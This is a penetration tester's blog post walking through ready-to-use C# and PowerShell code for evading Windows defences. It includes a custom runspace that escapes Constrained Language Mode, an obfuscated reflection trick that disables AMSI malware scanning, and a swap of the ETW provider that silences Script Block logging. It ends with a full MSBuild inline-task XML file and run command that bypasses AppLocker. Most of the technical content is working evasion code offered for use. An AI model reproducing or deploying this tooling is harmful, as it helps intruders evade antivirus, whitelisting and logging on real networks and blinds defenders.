---
title: "Using MSBuild to bypass PowerShell Constrained Language Mode, AMSI and Script Block Logging"
excerpt: "Post demonstrating how to use C# and MSBuild to create a PowerShellish CLI without CLM, AMSI and Script Block Logging, whilst bypassing default AppLocker rules."
last_modified_at: 2018-01-03T09:45:06-05:00
header:
  teaser: "assets/images/markup-syntax-highlighting-teaser.jpg"
tags: 
  - c#
  - NET
  - powershell
  - Contstrained Language Mode
  - CLM
  - AMSI
  - Script Block Logging
toc: false
classes: wide
layout: single
---

Often during engagements, I find that any semi-mature organisation will apply AppLocker, have PowerShell set to Constrained Language Mode and have Anti-Virus turned on. In more mature organisations they will monitor PowerShell Script Block logs to identify malicious PowerShell Activity.
<br/><br/>
In this post, I will go other how to use C# and a classic AppLocker bypass using MSBuild to defeat all these, and once again obtain a PowerShell-ish CLI without AV, in Full Language Mode and without Script Block logging.
### Whats AppLocker?
AppLocker is Microsoft's version of application whitelisting. It allows organisations to control what type of executuable content users are allowed to run on their Windows machines. For example, it can be used to stop random executeables from an unknown publisher from running. This means even if we built a C# application, often we can't just run the resulting executeable without finding some other method of running it, these methods often use Microsoft signed binaries or scripts termed Living Off the Land Binaries and Scripts (LOLBAS), a classic example of this is the Microsoft MSBuild binary.
### Constrained Language Mode
For years attackers have been using the power of PowerShell to perform various useful tasks, including post explotation, network enumeration, as can be seen in the awesome PowerSploit library. Constrained Language Mode is a particular language mode that PowerShell can be set into that heavily restricts the types of commands that can be run, severly reducing the usefulness of various PowerShell based malware, often making them unusable. THis includes disabling Add-Type compilation, making it harder if not impossible to access and use the Win32/Native API's. This is a recommended security setting to turn on in PowerShell, and mature organisations will (or should) have this set on all user endpoints. One way of checking to see if PowerShell CLM is enabled is by running the following in PowerShell:
{% highlight csharp %}
$ExecutionContext.SessionState.LanguageMode
{% endhighlight %}
If it says "ConstrainedLanguage" then CLM is enabled, otherwise it will say state "FullLanguage".
One method of enabling CLM system wide, is to set the environment variable __PSLockDownPolicy to 4. Doing this will enable CLM for everyone (including Administrators).
### AMSI 
Anti-Malware Scan Interface (AMSI) is a Windows interface that allows applications to connect to Anti-Virus soutions. In PowerShell, AMSI is used to scan every command before it is run, to check if it contains known malicious content. This stops us from being able to download and run known malicious PowerShell scripts in memory without bypassing it.<br/><br/>
### ETW
Event Tracing for Windows (ETW) allows applications to generate events (act as ETW providers) that can be monitored and displayed by other services/applications (ETW consumers). In PowerShell the usage of this is termed PowerShell Script Block logging, where certain interesting scripts/commands run are logged, which can be viewed from Windows Event Viewer or monitored by various Anti-Virus/EDR solutions. This is at least one method of capturing potentially malicious PowerShell activity by security vendors.


### POC Code
OK, so enough talking, time for some code. <br/><br/>
## Part 1 - Creating a fake "PowerShell" CLI
To default Constrained Language, we can use C#. PowerShell.exe, the normal way of opening/using PowerShell, is effectively a GUI application that will create an instance of the PowerShell .NET object and let you interact with it (via the CLI). So for us to programmatically use and bypass security features enabled in the PowerShell.exe's instance of the .NET PowerShell object, we need to create our own .NET PowerShell object.  To do this we need to use the .NET assembly that contains PowerShell itself, located in System.Management.Automation.dll (C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\). <br/><br/>
With this instance, we can run commands by calling the AddScript method on our new PowerShell object, then running the Invoke() method to invoke the stored command. From this, we can combine a while loop to create a fake PowerShell CLI. The code for this is:
{% highlight csharp %}
using System;
using System.IO;
using System.Management.Automation;
using System.Collections.ObjectModel;
namespace SharpPowershell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            PowerShell ps = PowerShell.Create();
            Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
            String cmd;
            while ((cmd = Console.ReadLine()) != null)
            {
                ps.AddScript(cmd); 
                try { 
                    
                    Collection<PSObject> psOutput = ps.Invoke();   
                    foreach (PSObject output in psOutput) { 
                        if (output != null) {
                            Console.WriteLine(output.ToString());
                        } 
                    }
                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
                    foreach (ErrorRecord error in errors)
                    {
                        Console.WriteLine("**** ERROR ****");
                        Console.Error.WriteLine(error.ToString());
                    }
                } catch (Exception e) { 
                    Console.WriteLine("**** ERROR ****"); 
                    if (e.Message != null) { 
                        Console.WriteLine(e.Message); 
                    } 
                    ps.Stop(); 
                    ps.Commands.Clear(); 
                }
                ps.Commands.Clear(); 
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
            }
        }
    }
}
{% endhighlight %}
The above code will create an instance of the .NET PowerShell object. We then in a loop, read user input and treat it as a PowerShell command. We add the user input as a script (AddScript), and run it (Invoke). The return from Invoke is a Collection (effectively a list) of PSOutput objects, containing the output from the user's input (the script we added). We iterate over these that returned from running the command and print it to the console.
After, we want to also print out any Error output from the PowerShell object. When a command is run and a PowerShell error occurs, it is added to the Error I/O stream in the PowerShell object. We read all the Error output (of type ErrorRecord) that was generated by the command and print it to the console (since we perform a ReadAll() operation on a Stream, the Stream will become empty).
In case this operation of running a command, and printing its output runs into a runtime exception, we create an exception handler, and simply print the exception (not the most graceful method, but this way an issue with one command won't crash our program entirely).<br/><br/>

After the command has run (or exception caught) we need to remove the commands/scripts we added before (the Invoke method doesn't remove the added commands/scripts) otherwise we will rerun every previous command whenever Invoke is called. <br/><br/>
To compile the above, you will need to add a reference to the C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll .NET assembly.
Once compiled, and run we obtain a PowerShell CLI clone:
{% include figure image_path="/assets/img/sharppowershelllinit.png" alt="" caption="" %}
## Part 2 - Defeating CLM via Custom Runspaces 
In PowerShell, each "session" has at least one Runspace. A Runspace is a container for the variables, scripts run and is what is responsible for running PowerShell commands. The PowerShell object is responsible for collecting commands, then sending it to its created and assigned Runspace, which will return output, that the PowerShell object returns. A PowerShell instance can have multiple Runspaces (called Runspace Pool) which allows multithreaded execution. For us the important thing to note is that when we say PowerShell has Constrained Language Mode set, we mean that the Runspace being used by the PowerShell instance has Constrained Language Mode set. When we set Constrained Language Mode on a machine/user, we are saying that when powershell.exe is used, a PowerShell object and the Runspace created is set to Constrained Language. When we create our own instance of PowerShell, the Runspace may or may not have Constrained Language Mode set on it during creation.<br/><br/>
Looking at our example we can see Constrained Language Mode is not set on our PowerShell instance by replacing the first line of the program with:
{% highlight csharp %}
Runspace rs = RunspaceFactory.CreateRunspace(); 
rs.Open(); 
PowerShell ps = PowerShell.Create();
ps.Runspace = rs; 
{% endhighlight %}      
{% include figure image_path="/assets/img/sharppowershellnoclm.png" alt="" caption="" %}
Even though in our example, CLM was not enabled, if it was we could instead manually create a new PowerShell Runspace, and assign it to our instance of PowerShell. To do this we can use the RunspaceFactory to create a new Runspace (this by default does not have CLM enabled) and assign it to our PowerShell object by replacing the first line with:
{% highlight csharp %}
Runspace rs = RunspaceFactory.CreateRunspace(); 
rs.Open(); 
PowerShell ps = PowerShell.Create();
ps.Runspace = rs; 
{% endhighlight %}
## Part 3 - Defeating AMSI 
When we run the program, and try to download PowerView.ps1 into memory, AMSI flags it as malware and makes it unuseable, as can be seen below:
{% include figure image_path="/assets/img/sharppowershellamsi.png" alt="" caption="" %}
Therefore for this to be useful, we will need to bypass AMSI. To do this, I used an obfuscated version of the "amsiInitFailed" set to true method. This method was original discovered by <a href="https://twitter.com/mattifestation">Matt Graeber</a>. This method of disabling AMSI is performed by setting a specific variable located in the loaded .NET assembly class System.Management.Automation.AmsiUtils, which is responsible for intializing and utilising AMSI in PowerShell. Within this class, there exists a static variable called "amsiInitFailed", which is a variable that stores a boolean value stating whether AMSI was successfully initialized (as the first step of using AMSI is to obtain an AMSI context, which is done by calling AmsiInitialize within the AMSI dll amsi.dll). If this variable is true, then PowerShell will no longer send commands to be checked by AMSI, as it assumes that the AMSI initialization step failed. The original code obtains a reference to the System.Management.Automation.AmsiUtils type (class), gets a reference to the field (variable) amsiInitFailed and sets its value to true:
{% highlight csharp %}
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
{% endhighlight %}
Unsurprisingly, this command is now blocked by AMSI, so a varation of this is used (one that doesn't contain the string 'AmsiUtils' or 'amsiInitFailed'):
{% highlight csharp %}
$a=[Ref].Assembly.GetTypes(); Foreach($b in $a) {if ($b.Name -like "*Ut*s") {$c=$b; break}};$d=$c.GetFields('NonPublic,Static'); Foreach($e in $d) {if ($e.Name -like "*Init*") {$e.SetValue($null, $true)}} 
{% endhighlight %}
What this command does, is iterate over all loaded types, checks if its name follows the format _something_Ut_something_s, which only AmsiUtils matches (in a default PowerShell install) and saves this to a variable ($c). With this type now stored, we iterate over all fields that are declared as NonPublic and Static (such as amsiInitFailed) and check if its name follows the format something_Init_something, which only amsiInitFailed matches. With any fields that match, set its value to "true". <br/>
This command added to the PowerShell object and invoked before we read user input:
{% highlight csharp %}
String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) { if ($b.Name -clike \"A*U*s\") {$c =$b; break} };$d =$c.GetFields('NonPublic,Static');Foreach($e in $d) { if ($e.Name -like \"*Init*\") {$f =$e} };$f.SetValue($null, $true);"; 
ps.AddScript(cmd); 
ps.Invoke();
{% endhighlight %}
Now when we run the executeable, we are able to download and use PowerView.
{% include figure image_path="/assets/img/sharppowershellnoamsi.png" alt="" caption="" %}
## Part 4 - Defeating PowerShell Script Block Logging 
When running commands in our PowerShell object, you can see events being generated via PowerShell Script Block Logging. For example, when importing PowerView and looking in EventViewer > Applications and Service Logs > Windows > PowerShell > Operational, we see an event has been generated showing the contents of PowerView and our AMSI bypass:
{% include figure image_path="/assets/img/powerviewgettinglogged.png" alt="" caption="" %}
{% include figure image_path="/assets/img/amsigettinglogged.png.png" alt="" caption="" %}
Multiple AV/EDR products monitor such events, and can be used to identify potentially malicious activity occuring on this machine, so ideally we want to disable this. These events are a form of Event Tracing for Windows, where PowerShell has a registered ETW provider, that other applications may consume. We can see this by running the logman.exe command to list all ETW providers, and filter for ones containing PowerShell:
{% highlight csharp %}
c:\Windows\System32\logman.exe query providers | findstr PowerShell
{% endhighlight %}
{% include figure image_path="/assets/img/etwproviders.png" alt="" caption="" %}
In the above screenshot, we see an ETW provider for PowerShell (Microsoft-Windows-PowerShell) and a GUID in curly braces next to it. This is the unique ID assigned to this particular ETW Provider. When an application wishes to write an event to a provider, it references it by the unique ID. Similarly, when reading events (acting as a consumer) the ID is used to reference which ETW Provider to read from (via a event tracing session). A consumer will use at least event tracing session, which is responsible for taking the events from a provider, and providing them to the consumer. To list these sessions, we can run the command as Administrator:
{% highlight csharp %}
logman query -ets
{% endhighlight %}
{% include figure image_path="/assets/img/etwsessions.png" alt="" caption="" %}
This shows a tracing session for Windows EventLog Application (EventLog-Application). We can then run the following command to see what providers this tracing session is using:
{% highlight csharp %}

logman query "EventLog-Application" -ets

{% endhighlight %}
{% include figure image_path="/assets/img/etwtracesessionlog.png" alt="" caption="" %}
In PowerShell, the ETW Provider ID is stored within the type System.Management.Automation.Tracing.EventProvider. This type is used by the type System.Management.Automation.Tracing.PSEtwLogProvider, within the etwProvider field. When PowerShell runs a command or script block that it believes should be noted, it will write to the ETW Provider specified by this field. To bypass ETW, we can set the value of the field etwProvider to an instance of type System.Management.Automation.Tracing.EventProvider, where the GUID set for the ETW provider is a randomly generated GUID. That way when the PSEtwLogProvider is used to send ETW events, it will use the etwProvider field containing a non-existent GUID and write to this non-existent provider. The code to do this is:
{% highlight csharp %}
var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider"); 
if (PSEtwLogProvider != null) { 
    var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static); 
    var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid()); EtwProvider.SetValue(null, EventProvider); 
}
{% endhighlight %}
This code will attempt to get a reference to the PSEtwLogProvider type (the type that contains a field of type EventProvider, that contains the GUID of the PowerShell ETW provider). If successful then a reference to the field "etwProvider" is obtained. A new instance of type EventProvider is created, where we pass to it a newly created GUID which will contain an arbritrary GUID that does match any ETW Provider GUID (technically this may reference an existing one, but due to the sife of the GUID this is unlikely). With this new instance of EventProvider, we set the "etwProvider" field to this value. By doing this, when PowerShell writes ETW events, they will be written to a non-existent ETW Provider, effectively disappearing. <br/>
This code is run first, before performing the AMSI bypass, to ensure that ETW doesn't pick up on our AMSI bypass PowerShell command. When running this the executeable, you will now see that no new PowerShell log events can be viewed in EventViewer.

## Part 5 - Bypassing AppLocker
At this point we have a .NET Assembly executeable that runs a fake PowerShell CLI that allows us to bypass CLM, AMSI and Script Block logging. Next we want to build this into an AppLocker (or generic Application Whitelisting) bypass. For this I used the classic "MSBuild" bypass to run arbritrary C# source code. MSBuild is a Microsoft signed binary that exists on most versions on Windows, aka the Microsoft Build Engine, is used to compile projects (including C# projects). The details of how and what to compile, including the configuration settings can be specified by an XML file. Starting with Microsoft .NET Framework 4.0, this XML file can specify inline tasks. These are compilation tasks to perform when a project is being compiled, that are themselves defined as C# source code within the XML file (previiously the task would have to be a precompiled .NET Assembly DLL). This allows us to specify a task that contains our PowerShell CLI code, as C# code within an XML file that when MSBuild compiles our project it will instead run our CLI and never complete (until we exit our program). <br /> <br/>
To do this, we define a new task within the XML, then specify the C# code to compile and run. This C# code must be a class that implements the Task interface. Specfically it must have a method called Execute that returns a boolean. We also need to specify in the XML what other namespaces we use, and in our case the location of the .NET assembly containing the PowerShell object (System.Management.Automation.dll). <br/><br/>
The MSBuild XML file is:
{% highlight csharp %}
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
    <ItemGroup>
      <Reference Include="System" />
      <Reference Include="System.Core" />
      <Reference Include="System.Xml.Linq" />
      <Reference Include="System.Data.DataSetExtensions" />
      <Reference Include="Microsoft.CSharp" />
      <Reference Include="System.Data" />
      <Reference Include="System.Net" />
      <Reference Include="System.Xml" />
      
    </ItemGroup>
 <Target Name="Hello">
    <ClassExample/>
 </Target>
 
 <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
 <Task>
    <Using Namespace="System"/>                                                                                                                                                                                                            
    <Using Namespace="System.Reflection"/>                                                                                                                                                                                                 
    <Using Namespace="System.Diagnostics"/> 
    <Using Namespace="System.Net"/>       
    <Using Namespace="System.Management.Automation"/>   
    <Reference Include="System.Management.Automation" />    
                                                                                                                                                                                            
    <Code Type="Class" Language="cs">                                                                                                                                                                                                      
    <![CDATA[                                                                                                                                                                                                                              
        using System;                                                                                                                                                                                                                      
        using System.IO;  
        using System.Text;                                                                                                                                                                                                                 
        using System.Reflection;                                                                                                                                                                                                           
        using Microsoft.CSharp;                                                                                                                                                                                                            
        using System.Runtime.InteropServices;                                                                                                                                                                                              
        using Microsoft.Build.Framework;                                                                                                                                                                                                   
        using Microsoft.Build.Utilities;       
        using System.Security.Cryptography;     
        using System.Net; 
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        using System.Collections.ObjectModel;
                                                                                                                                                                                      
        public class ClassExample : Task, ITask                                                                                                                                                                                            
        {                                                                                                                                                                                                                                  
            public override bool Execute()
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            Console.WriteLine();
	    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (PSEtwLogProvider != null){
            	var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                EtwProvider.SetValue(null, EventProvider);
            }
            String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) { if ($b.Name -clike \"A*U*s\") {$c =$b; break} };$d =$c.GetFields('NonPublic,Static');Foreach($e in $d) { if ($e.Name -like \"*Init*\") {$f =$e} };$f.SetValue($null, $true);";
            ps.AddScript(cmd);
            ps.Invoke();
            Console.Write("PS " + Directory.GetCurrentDirectory()+">");
            while ((cmd = Console.ReadLine()) != null){
                ps.AddScript(cmd);
                try{
                    Collection<PSObject> psOutput = ps.Invoke();
                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
                    foreach (ErrorRecord error in errors)
                    {
                        Console.WriteLine(error.ToString());
                    }
		    foreach (PSObject output in psOutput){
                        if (output != null){
                            Console.WriteLine(output.ToString());
                        }
                    }
                }catch (Exception e){
                    Console.WriteLine("**** ERROR ****");
                    if (e.Message != null){
                        Console.WriteLine(e.Message);
                    }
                    ps.Stop();
                    ps.Commands.Clear();
                }
                ps.Commands.Clear();
                Console.Write("PS " + Directory.GetCurrentDirectory()+">");    
            }
            rs.Close();
            return true;
            }
            
            
        }
        ]]>
        </Code>
    </Task>
    </UsingTask>
</Project>
{% endhighlight %}
Here we are specifying a Project, and including references to other .NET assemblies this project needs (in the ItemGroup > References). We say that we are going to use a task (UseTask) called ClassExample. After this the task is defined between the Task tags. We specify what namespaces need to be included. We then go on to specify the class in C# (as specified by the Code tag) with a class called ClassExample, that contains the Execute method. This is the method that will get run when MSBuild attempts to compile this project. To make sure we are compliant with this method, the very last statement is a boolean return (return true). <br/><br/>
This file can then be run using MSBuild C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe for 64 bit and C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe for 32 bit. The command to run this is:
{% highlight csharp %}
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-powershell.xml
{% endhighlight %}
{% include figure image_path="/assets/img/msbuildpowershell.png" alt="" caption="" %}
### GitHub link

This has been combined into one POC on my GitHub, located <a href="https://github.com/ret2desync/SharpPowerShell"> here</a>